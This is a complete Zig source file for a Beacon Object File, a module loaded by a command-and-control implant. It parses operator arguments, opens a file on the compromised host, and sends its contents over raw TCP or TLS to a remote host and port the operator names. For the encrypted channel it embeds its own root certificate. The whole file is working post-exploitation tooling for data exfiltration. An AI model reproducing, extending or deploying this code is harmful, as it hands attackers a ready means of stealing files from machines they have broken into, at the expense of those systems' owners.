const std = @import("std");
const posix = @import("std").posix;
const bofapi = @import("bof_api");
const beacon = bofapi.beacon;
const tls = @import("ianicTls");

comptime {
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memmove");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("__stackprobe__");
    @import("bof_api").embedFunctionCode("__divti3");
    @import("bof_api").embedFunctionCode("__ashlti3");
    @import("bof_api").embedFunctionCode("__divdi3");
    @import("bof_api").embedFunctionCode("__udivdi3");
    @import("bof_api").embedFunctionCode("__ashldi3");
    @import("bof_api").embedFunctionCode("__modti3");
    @import("bof_api").embedFunctionCode("__aeabi_uldivmod");
    @import("bof_api").embedFunctionCode("__aeabi_uidivmod");
    @import("bof_api").embedFunctionCode("__aeabi_uidiv");
    @import("bof_api").embedFunctionCode("__aeabi_llsl");
}

// BOF-specific error codes
const BofErrors = enum(u8) {
    AccesDenied = 0x1,
    NoArgsProvided,
    BadArgsProvided,
    NotSupportedAddressType,
    ConnectionError,
    DataTransferError,
    ReadFailedError,
    UnknownError,
};

const AddressType = enum(u8) {
    OPEN = 0x1,
    CREATE,
    STDIN,
    TCP,
    TLS,
    UNRECOGNIZED,
};

const minica_pem =
\\-----BEGIN CERTIFICATE-----
\\MIIDPzCCAiegAwIBAgIIa/kXZJi16EYwDQYJKoZIhvcNAQELBQAwIDEeMBwGA1UE
\\AxMVbWluaWNhIHJvb3QgY2EgNmJmOTE3MCAXDTI2MDUyNTEwMjMxMloYDzIxMjYw
\\NTI1MTAyMzEyWjAgMR4wHAYDVQQDExVtaW5pY2Egcm9vdCBjYSA2YmY5MTcwggEi
\\MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDFguKvyy3iUvvLJDDlIiaIINh6
\\kUxDNC25df7emhhTFUXJMfZAPjXlz6l9I63Im/TJqQE8Dv2oEtcwD2OmHIdMIk/i
\\wSe/+8uC1QjqOBLSsfflfx2Say4OlvOCIrRy8QPqnRq3+U/I1wGIEe1ADH5UT+Dj
\\hcDitJbgKLdCJXlDSClPj5cCGEAPiuyM+kGW4MmY/2Gd9BVo2VTixXUBexTsV8ts
\\Lu3JRZqBzJuT4XZQ8qLRaXx/Xssgp+cxyoUsnFChWCBnev8uijJWTlSNkt/Rppt8
\\rvE6PoIXqvLn8oZ3f+2fO6j3j1pI+uXoBZkKnAi84InZRpbSLBmNHgnRndt9AgMB
\\AAGjezB5MA4GA1UdDwEB/wQEAwIChDATBgNVHSUEDDAKBggrBgEFBQcDATASBgNV
\\HRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBRn8LqQx8ZriglHcRLfdriR6ibn/zAf
\\BgNVHSMEGDAWgBRn8LqQx8ZriglHcRLfdriR6ibn/zANBgkqhkiG9w0BAQsFAAOC
\\AQEATlkzeKYzFLNXmDBV8zC951SMBsD36Gi/plwMmK8Bp117t5OGIPgE1JGZZxZq
\\ycVf/pejZlDkNl3VnbtWnnmQIzswpKoL59XJL/x/U/KBCmEURlQLAh6RlchL3rfj
\\Mz3T4ImG6N5IJv7Z61wTWqtIK1/t3dedoMpte/3oyK43NNQfRkiW7x7HGZHSa+lq
\\4ubgW+U9JSfdCDM7rgl6zXmpVZD8Ddo7IGuSiRULtIsSpAKEXOBzC63xB+QUCXta
\\8xMY4HSQQ8uXNnZm4kURKOcoMXxXv8OLsknJ40GOTtkULU0m2RK4D1lQMC8w0RRe
\\AO8i38yIm9foRIBxdVT/dDUG2w==
\\-----END CERTIFICATE-----
;

fn addCertsFromMemory(cb: *std.crypto.Certificate.Bundle, alloc: std.mem.Allocator, cert_buf: []const u8) std.crypto.Certificate.Bundle.AddCertsFromFileError!void {

    const size = cert_buf.len;
    const decoded_size_upper_bound = size / 4 * 3;
    const needed_capacity = std.math.cast(u32, decoded_size_upper_bound + size) orelse
        return error.CertificateAuthorityBundleTooBig;
    try cb.bytes.ensureUnusedCapacity(alloc, needed_capacity);
    const end_reserved: u32 = @intCast(cb.bytes.items.len + decoded_size_upper_bound);
    const buffer = cb.bytes.allocatedSlice()[end_reserved..];
    @memcpy(buffer[0..size], cert_buf[0..size]);
    const encoded_bytes = buffer[0..size];

    const begin_marker = "-----BEGIN CERTIFICATE-----";
    const end_marker = "-----END CERTIFICATE-----";

    const b64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');

    const now_sec = std.time.timestamp();

    var start_index: usize = 0;
    while (std.mem.indexOfPos(u8, encoded_bytes, start_index, begin_marker)) |begin_marker_start| {
        const cert_start = begin_marker_start + begin_marker.len;
        const cert_end = std.mem.indexOfPos(u8, encoded_bytes, cert_start, end_marker) orelse
            return error.MissingEndCertificateMarker;
        start_index = cert_end + end_marker.len;
        const encoded_cert = std.mem.trim(u8, encoded_bytes[cert_start..cert_end], " \t\r\n");
        const decoded_start: u32 = @intCast(cb.bytes.items.len);
        const dest_buf = cb.bytes.allocatedSlice()[decoded_start..];
        //cb.bytes.items.len += try std.crypto.Certificate.Bundle.base64.decode(dest_buf, encoded_cert);
        _ = try b64_decoder.decode(dest_buf, encoded_cert);
        cb.bytes.items.len += try b64_decoder.calcSizeForSlice(encoded_cert);
        try cb.parseCert(alloc, decoded_start, now_sec);
    }
}

fn checkAddressType(addr_type: []const u8) AddressType {
    if(std.mem.eql(u8, "OPEN", addr_type)) {
        return AddressType.OPEN;
    } else if(std.mem.eql(u8, "CREATE", addr_type)) {
        return AddressType.CREATE;
    } else if(std.mem.eql(u8, "TCP", addr_type)) {
        return AddressType.TCP;
    } else if(std.mem.eql(u8, "TLS", addr_type)) {
        return AddressType.TLS;
    }
    else
        return AddressType.UNRECOGNIZED;
}

fn pumpData(r_iface: *std.Io.Reader, w_iface: *std.Io.Writer) !usize {

    const written = try r_iface.streamRemaining(w_iface);
    return written;
}

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    if (alen == 0) {
        return @intFromEnum(BofErrors.NoArgsProvided);
    }

    const allocator = std.heap.page_allocator;

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    var srcAddrType: AddressType = undefined;
    var src_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    var sinkAddrType: AddressType = undefined;
    var sink_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    const src_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
    const sink_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);

    if (!std.mem.eql(u8, "", src_address)) {

        if(std.mem.eql(u8, "-", std.mem.sliceTo(src_address, 0)))
            srcAddrType = AddressType.STDIN;

        src_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(src_address, 0), ':');
        const addrPrefix = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);

        srcAddrType = checkAddressType(addrPrefix);
        if (srcAddrType != AddressType.OPEN)
            return @intFromEnum(BofErrors.NotSupportedAddressType);

        const file_path = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        const file = std.fs.openFileAbsolute(file_path, .{ .mode = .read_only }) catch return 1;
        defer file.close();

        var recv_buffer: [4096]u8 = undefined;
        var file_r = file.reader(&recv_buffer);
        const file_r_iface = &file_r.interface;

        if (!std.mem.eql(u8, "", sink_address)) {

            sink_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(sink_address, 0), ':');
            const sinkPrefix = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);

            sinkAddrType = checkAddressType(sinkPrefix);
            if (!(sinkAddrType == AddressType.TCP or sinkAddrType == AddressType.TLS))
                return @intFromEnum(BofErrors.NotSupportedAddressType);

            const host = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
            const port = std.fmt.parseUnsigned(u16, sink_addr_iter.next() orelse return 1, 10) catch return 1;

            const tcp = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);
            defer tcp.close();

            var tcp_buf: [tls.output_buffer_len]u8 = undefined;
            var tcp_w = tcp.writer(&tcp_buf);

            // Upgrade tcp connection to tls
            if (sinkAddrType == AddressType.TLS) {
                var tcp_buf_r: [tls.input_buffer_len]u8 = undefined;
                var tcp_r = tcp.reader(&tcp_buf_r);

                var root_ca: std.crypto.Certificate.Bundle = .{};
                const s: []const u8 = minica_pem[0..minica_pem.len];
                addCertsFromMemory(&root_ca, allocator, s) catch return 94;
                defer root_ca.deinit(allocator);

                var diagnostic: tls.config.Client.Diagnostic = .{};

                var conn = tls.client(tcp_r.interface(), &tcp_w.interface, .{
                    .host = host,
                    .root_ca = root_ca,
                    .diagnostic = &diagnostic,
                }) catch return 98;

                var n: usize = 0;
                var tls_buf: [tls.output_buffer_len]u8 = undefined;
                while(true) {
                    n = file_r_iface.readSliceShort(&tls_buf) catch return 33;
                    if (n < tls_buf.len) {
                        conn.writeAll(tls_buf[0..n]) catch return 97;
                        break;
                    }
                    else
                        conn.writeAll(&tls_buf) catch return 97;

                }

                std.Thread.sleep(1000000000);
                tcp.close();
                return 0;
            }

            _ = pumpData(file_r_iface, &tcp_w.interface) catch @intFromEnum(BofErrors.DataTransferError);
        }
    }

    return 0;
}
